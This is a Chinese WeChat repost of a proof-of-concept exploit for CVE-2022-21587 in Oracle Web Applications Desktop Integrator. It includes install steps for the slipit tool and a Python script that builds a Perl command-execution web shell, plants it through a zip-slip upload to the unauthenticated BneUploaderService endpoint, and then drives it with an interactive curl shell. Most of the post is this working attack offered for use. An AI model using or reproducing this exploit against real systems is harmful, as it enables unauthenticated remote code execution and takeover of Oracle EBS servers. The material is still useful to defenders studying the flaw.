<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/2igdEnxcpcVqIkUQ2pJt5w)

**0x01 前言  
**

CVE-2022-21587 漏洞允许未经身份验证的攻击者通过 HTTP 进行网络访问，从而破坏 Oracle Web Applications Desktop Integrator。成功利用此漏洞可导致 Oracle Web Applications Desktop Integrator 被接管

需要安装 python3 slipit 依赖

```
安装 slipit：
1.git clone https://github.com/usdAG/slipit
2.cd slipit
3.python3 setup.py sdist
4.pip3 install --user dist/*
5.export PATH=/home/yourname/.local/bin:$PATH

```

**0x02 Poc  
**

POC 内容，需要自行填充 shell 内容  

```
#!/usr/bin/python3
#POC by HMs
#CVE-2022-21587
import requests
import os
import sys
shell = ''' 
use CGI;
print CGI::header( -type => 'text/plain' );
my $cmd = CGI::http('HTTP_CMD');
print system($cmd);
exit 0;
'''
def Write_Shell():
  with open("txkFNDWRR.pl", "w") as f:
    f.writelines("%s \n" %(shell))
  os.system("slipit --overwrite --separator '/' --depth 5 --prefix '/FMW_Home/Oracle_EBS-app1/common/scripts/' txkFNDWRR.zip txkFNDWRR.pl")
  os.system("uuencode txkFNDWRR.zip txkFNDWRR.zip > t.uue")
def exploit():
  Write_Shell()
  host = sys.argv[1]
  if host.endswith == '/':
    url = host + 'OA_HTML/BneUploaderService?bne:uueupload=true'
    url_shell = host + '/OA_CGI/FNDWRR.exe'
  else:
    url = host + '/OA_HTML/BneUploaderService?bne:uueupload=true'
    url_shell = host + '/OA_CGI/FNDWRR.exe'
  file = 't.uue'
  up = {
    'text':(file,open(file, 'rb'), 
      "multipart/mixed"
      )
    }
  request = requests.post(url,files=up)
  if request.status_code == 200:
    print('\n-----------------------------------\n[+] Exploiting .......\nShell has uploaded!\n-----------------------------------\n')
    print('`press q || Q || quit to exit !!!` \n\n')
    print('`exploit: python3 http|https://example.com` \n\n')
    while True:
      cmd = input("~shell[~]: ")
      if cmd == 'q' or cmd == 'quit' or cmd == 'Q':
        break
      else:
        os.system("curl -ks '%s' -H 'cmd: %s'" % (url_shell,cmd))
  else:
    print('not vuln!')      
if __name__ == '__main__':
  exploit()

```

**0x03 漏洞分析参考**  

```
https://attackerkb.com/topics/Bkij5kK1qK/cve-2022-21587/rapid7-analysis?referrer=notificationEmail

```

**0x01 工具介绍**

1、通过阅读原文，到项目地址下载

2、点击下方名片回复 " _**21587**_ " 获取